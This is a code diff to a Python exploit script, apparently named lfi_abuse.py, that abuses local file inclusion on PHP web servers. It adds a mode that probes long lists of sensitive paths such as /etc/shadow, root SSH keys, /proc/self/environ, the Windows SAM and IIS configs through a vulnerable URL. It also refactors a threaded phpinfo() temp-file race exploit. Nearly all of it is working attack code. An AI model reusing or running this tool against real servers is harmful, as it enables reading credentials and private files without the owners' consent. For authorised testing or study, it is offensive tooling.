@@ -5,8 +5,173 @@ import socket
 import re
 import argparse
 import os
+from concurrent.futures import ThreadPoolExecutor
+import requests
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 counter = 0
+
+# Linux system log files and configuration paths
+LINUX_FILES = [
+    # Apache logs
+    "/var/log/apache2/access.log",
+    "/var/log/apache2/error.log",
+    "/var/log/apache/access.log",
+    "/var/log/apache/error.log",
+    "/var/log/httpd/access_log",
+    "/var/log/httpd/access.log",
+    "/var/log/httpd/error_log",
+    "/var/log/httpd/_error_log",
+    "/var/log/httpd/_access_log",
+    "/etc/httpd/conf/logs/error_log",
+    "/etc/httpd/logs/error_log",
+    "/var/log/apache2/_access_log",
+    "/var/log/apache2/_error.log",
+    "/var/log/apache2/_error_log",
+    "/usr/local/apache2/log/error_log",
+    "/var/log/httpd-access.log",
+    "/usr/local/apache/logs/access_log",
+    "/usr/local/apache/logs/access.log",
+    "/usr/local/apache/logs/error_log",
+    "/usr/local/apache/logs/error.log",
+    "/var/log/apache/logs/access.log",
+    "/var/log/apache/logs/error.log",
+    "/etc/httpd/logs/acces_log",
+    "/etc/httpd/logs/acces.log",
+    "/etc/httpd/logs/error_log",
+    "/etc/httpd/logs/error.log",
+    
+    # Nginx logs
+    "/var/log/nginx/access.log",
+    "/var/log/nginx/error.log",
+    "/var/log/nginx/error_log",
+    "/var/log/nginx/access_log",
+    "/var/log/nginx-access.log",
+    "/var/log/nginx/mysite.com.access.log",
+    "/var/log/nginx/mysite.com.error.log",
+    "/var/log/nginx/%saccess.log",
+    "/var/log/nginx/%serror.log",
+    
+    # Web application logs
+    "/var/www/logs/access_log",
+    "/var/www/logs/access.log",
+    "/var/www/logs/error_log",
+    "/var/www/logs/error.log",
+    
+    # System logs
+    "/var/log/auth.log",
+    "/var/log/vsftpd.log",
+    "/var/log/sshd.log",
+    "/var/log/mail",
+    "/var/mail",
+    "/var/log/access_log",
+    "/var/log/access.log",
+    "/var/log/error_log",
+    "/var/log/error.log",
+    
+    # PHP Session
+    "/var/lib/php/sessions/sess_*",
+    "/var/lib/php5/sessions/sess_*",
+    "/tmp/sess_*",
+    
+    # Configuration files
+    "/etc/apache2/apache2.conf",
+    "/usr/local/etc/apache2/httpd.conf",
+    "/etc/httpd/conf/httpd.conf",
+    
+    # System files
+    "/proc/self/environ",
+    "/etc/passwd",
+    "/etc/shadow",
+    "/etc/issue",
+    "/etc/group",
+    "/etc/hostname",
+    "/etc/ssh/ssh_config",
+    "/etc/ssh/sshd_config",
+    "/root/.ssh/id_rsa",
+    "/root/.ssh/authorized_keys",
+    "/var/spool/mail/root"
+]
+
+# Windows system file paths
+WINDOWS_FILES = [
+    # Windows system files
+    "/boot.ini",
+    "/autoexec.bat",
+    "/windows/system32/drivers/etc/hosts",
+    "/windows/repair/SAM",
+    "/windows/panther/unattended.xml",
+    "/windows/panther/unattend/unattended.xml",
+    "/WINDOWS/repair/sam",
+    "/WINDOWS/repair/system",
+    
+    # Windows log files
+    "/windows/debug/NetSetup.log",
+    "/windows/iis5.log",
+    "/windows/iis6.log",
+    "/windows/iis7.log",
+    "/windows/system32/logfiles/W3SVC/iis*.log",
+    "/windows/system32/logfiles/W3SVC1/ex*",
+    "/windows/system32/logfiles/httperr/*.log",
+    
+    # IIS configuration
+    "/inetpub/wwwroot/web.config",
+    "/inetpub/wwwroot/global.asa",
+    "/inetpub/logs/LogFiles/W3SVC1/*.log",
+    
+    # XAMPP related paths
+    "/xampp/apache/logs/access.log",
+    "/xampp/apache/logs/error.log",
+    "/xampp/apache/conf/httpd.conf",
+    "/xampp/php/php.ini",
+    
+    # Other service logs
+    "/Program Files/MySQL/data/mysql/user.frm",
+    "/Program Files/MySQL/data/mysql/user.MYD",
+    "/Program Files/MySQL/data/mysql/user.MYI"
+]
+
+def enumerate_files(args):
+    """Enumerate files accessible through LFI"""
+    lfi_path = args.lfi
+    vulnerable_files = []
+    
+    try:
+        response = requests.get(lfi_path, verify=False)
+        if response.status_code in (404, 403):
+            print("[-] LFI url path is not reachable!")
+            return False
+    except:
+        print("[-] LFI url path is not reachable!")
+        return False
+    
+    # Select file list based on target platform
+    if args.platform == 'windows':
+        file_list = WINDOWS_FILES
+        print("[*] Testing Windows files...")
+    else:
+        file_list = LINUX_FILES
+        print("[*] Testing Linux files...")
+    
+    print(f"[*] Total files to test: {len(file_list)}")
+    
+    for file_path in file_list:
+        try:
+            test_url = lfi_path + file_path
+            response = requests.get(test_url, verify=False, timeout=5)
+            if response.status_code == 200 and len(response.content) > 0:
+                print(f"[+] Found accessible file: {file_path}")
+                vulnerable_files.append(file_path)
+        except:
+            continue
+    
+    if vulnerable_files:
+        print(f"[+] Found {len(vulnerable_files)} accessible files")
+        return vulnerable_files
+    else:
+        print("[-] No accessible files found")
+        return None
 
 def setup(host, phpinfo_path, lfi_path, tmp_dir):
     print("set up...")
@@ -44,18 +209,17 @@ Host: %s\r
 def send_request(host, port, request):
     """Send a request and return the response"""
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((host, port))
-        s.sendall(request)
-        response = b""
-        while True:
-            data = s.recv(4096)
-            if not data:
-                break
-            response += data
-            if data.endswith(b"0\r\n\r\n"):
-                break
-        s.close()
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.connect((host, port))
+            s.sendall(request)
+            response = b""
+            while True:
+                data = s.recv(4096)
+                if not data:
+                    break
+                response += data
+                if data.endswith(b"0\r\n\r\n"):
+                    break
         return response
     except socket.error as e:
         print(f"Socket error: {e}")
@@ -77,30 +241,29 @@ class ThreadWorker(threading.Thread):
 
     def phpinfo_lfi(self):
         """Perform the PHPInfo LFI exploit"""
-        phpinfo_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        lfi_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        phpinfo_s.connect((self.host, self.port))
-        lfi_s.connect((self.host, self.port))
-        phpinfo_s.sendall(self.php_info_req)
-        data = b""
-        while len(data) < self.offset:
-            data += phpinfo_s.recv(self.offset)
         try:
-            i = data.index(b"[tmp_name] =")
-            match = re.search(br'\[tmp_name\] =&gt; (.*)\n', data[i:])
-            if not match:
-                print("not found tmp_name")
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as phpinfo_s, \
+                 socket.socket(socket.AF_INET, socket.SOCK_STREAM) as lfi_s:
+                phpinfo_s.connect((self.host, self.port))
+                lfi_s.connect((self.host, self.port))
+                phpinfo_s.sendall(self.php_info_req)
+                data = b""
+                while len(data) < self.offset:
+                    data += phpinfo_s.recv(self.offset)
+                i = data.index(b"[tmp_name] =")
+                match = re.search(br'\[tmp_name\] =&gt; (.*)\n', data[i:])
+                if not match:
+                    print("not found tmp_name")
+                    return None
+                filename = match.group(1)
+                lfi_s.sendall(self.lfi_req % filename)
+                response = lfi_s.recv(4096)
+                if self.tag in response:
+                    return filename.decode()
                 return None
-            filename = match.group(1)
-        except ValueError:
+        except Exception as e:
+            print(f"Error in phpinfo_lfi: {e}")
             return None
-        lfi_s.sendall(self.lfi_req % filename)
-        response = lfi_s.recv(4096)
-        phpinfo_s.close()
-        lfi_s.close()
-        if self.tag in response:
-            return filename.decode()
-        return None
 
     def run(self):
         global counter
@@ -131,28 +294,17 @@ def get_offset(host, port, php_info_req):
     print("found %s at %i" % (response[i:i+10].decode(), i))
     return i + 256
 
-def main():
-    print('''Example: python lfi_abuse.py 127.0.0.1 80 -lfi "/lfi.php?file=" -p "linux" -tmp_dir "/tmp" -phpinfo "/phpinfo.php"''')
-    parser = argparse.ArgumentParser(description="LFI With PHPInfo()")
-    parser.add_argument("host", help="Target hostname or IP, e.g., 127.0.0.1")
-    parser.add_argument("port", type=int, help="Port number, e.g., 80")
-    parser.add_argument("-lfi", required=True, help="LFI path (e.g., lfi.php?file=)")
-    parser.add_argument("-phpinfo", default="php/phpinfo.php", help="PHPInfo path (default: php/phpinfo.php)")
-    parser.add_argument("-p", "--platform", choices=['linux', 'windows'], default="linux", 
-                        help="Platform: linux or windows (default: linux)")
-    parser.add_argument("-tmp_dir", help="Temporary directory (default: /tmp for linux, /xampp/tmp for windows)")
-    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
-    args = parser.parse_args()
-
-    print("LFI With PHPInfo()")
-    print("-=" * 30)
-
-    try:
-        host = socket.gethostbyname(args.host)
-    except socket.error as e:
-        print(f"Error with hostname {args.host}: {e}")
+def run_enumeration_mode(args, host):
+    """Run in file enumeration mode"""
+    print("[*] Starting file enumeration...")
+    vulnerable_files = enumerate_files(args)
+    if not vulnerable_files:
+        print("[-] File enumeration failed")
         sys.exit(1)
 
+def run_phpinfo_exploit(args, host):
+    """Run in PHPInfo exploitation mode"""
+    print("[*] Starting LFI via phpinfo()...")
     port = args.port
     pool_size = args.threads
     php_info_path = args.phpinfo
@@ -178,6 +330,7 @@ def main():
                    for _ in range(pool_size)]
     for thread in thread_pool:
         thread.start()
+
     try:
         while not event.wait(1):
             if event.is_set():
@@ -198,6 +351,40 @@ def main():
     print("Shutting down...")
     for thread in thread_pool:
         thread.join()
+
+def main():
+    print('''Example: 
+    1. PHPInfo exploit:
+       python lfi_abuse.py 127.0.0.1 80 -lfi "/lfi.php?file=" -p "linux" -tmp_dir "/tmp" -phpinfo "/phpinfo.php"
+    2. File enumeration:
+       python lfi_abuse.py 127.0.0.1 80 -lfi "/lfi.php?file=" --enum-files -p "linux"
+    ''')
+    parser = argparse.ArgumentParser(description="LFI With PHPInfo() and File Enumeration")
+    parser.add_argument("host", help="Target hostname or IP, e.g., 127.0.0.1")
+    parser.add_argument("port", type=int, help="Port number, e.g., 80")
+    parser.add_argument("-lfi", required=True, help="LFI path (e.g., lfi.php?file=)")
+    parser.add_argument("-phpinfo", default="php/phpinfo.php", help="PHPInfo path (default: php/phpinfo.php)")
+    parser.add_argument("-p", "--platform", choices=['linux', 'windows'], default="linux", 
+                        help="Platform: linux or windows (default: linux)")
+    parser.add_argument("-tmp_dir", help="Temporary directory (default: /tmp for linux, /xampp/tmp for windows)")
+    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
+    parser.add_argument("--enum-files", action="store_true", help="Enable file enumeration mode")
+    args = parser.parse_args()
+
+    print("LFI With PHPInfo()")
+    print("-=" * 30)
+
+    try:
+        host = socket.gethostbyname(args.host)
+    except socket.error as e:
+        print(f"Error with hostname {args.host}: {e}")
+        sys.exit(1)
+
+    # Choose operational mode
+    if args.enum_files:
+        run_enumeration_mode(args, host)
+    else:
+        run_phpinfo_exploit(args, host)
 
 if __name__ == "__main__":
     main()
